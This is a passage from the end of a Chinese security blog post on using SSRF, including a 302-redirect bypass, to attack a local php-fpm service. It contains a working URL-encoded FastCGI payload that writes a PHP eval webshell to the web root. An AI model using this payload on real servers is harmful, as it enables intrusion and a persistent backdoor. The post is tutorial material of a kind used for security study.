style="color:#828b96;font-style:italic">//127.0.0.1%3A9000/_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2505%2505%2500%250F%2510SERVER_SOFTWAREgo%2520/%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP/1.1%250E%2503CONTENT_LENGTH134%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A//input%250F%2517SCRIPT_FILENAME/var/www/html/index.php%250D%2501DOCUMENT_ROOT/%2500%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%2586%2504%2500%253C%253Fphp%2520system%2528%2527echo%2520PD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4%2520%257C%2520base64%2520-d%2520%253E%2520/var/www/html/shell.php%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500
+</span></span></span></code></pre></div><p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303281023278.png" alt="image-20230328102340167" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303281023278.png?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303281023278.png?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/pictures-master/202303281023278.png?size=large 2x" data-title="image-20230328102340167" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>#######  这里有一个利用ssrf302跳转打本地fpm的例子</p>
+<p>ssrf 302跳转绕过，打本地php-fpm</p>
+<p>302.php</p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p><img loading="lazy" src="C:/Users/HP/AppData/Roaming/Typora/typora-user-images/1666630726777.png" alt="1666630726777" srcset="C:/Users/HP/AppData/Roaming/Typora/typora-user-images/1666630726777.png?size=small, C:/Users/HP/AppData/Roaming/Typora/typora-user-images/1666630726777.png?size=medium 1.5x, C:/Users/HP/AppData/Roaming/Typora/typora-user-images/1666630726777.png?size=large 2x" data-title="1666630726777" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>类似的，我们形成一个命令为ls的payload</p>
+<p><img loading="lazy" src="C:/Users/HP/AppData/Roaming/Typora/typora-user-images/1666630796804.png" alt="1666630796804" srcset="C:/Users/HP/AppData/Roaming/Typora/typora-user-images/1666630796804.png?size=small, C:/Users/HP/AppData/Roaming/Typora/typora-user-images/1666630796804.png?size=medium 1.5x, C:/Users/HP/AppData/Roaming/Typora/typora-user-images/1666630796804.png?size=large 2x" data-title="1666630796804" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>参考：https://www.anquanke.com/post/id/262430#h2-8</p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2024-08-15 09:31:01">Updated on 2024-08-15&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/owasp/" class="post-tag" title="Tags - OWASP">OWASP</a><a href="/tags/ssrf/" class="post-tag" title="Tags - SSRF">SSRF</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/misc/108/" class="post-nav-item" rel="prev" title="Tshark"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Tshark</a>
+      <a href="/posts/owasp/ssrf/120/" class="post-nav-item" rel="next" title="SSRF-Bypass">SSRF-Bypass<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">东隅</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
+      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
+    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
+</html>
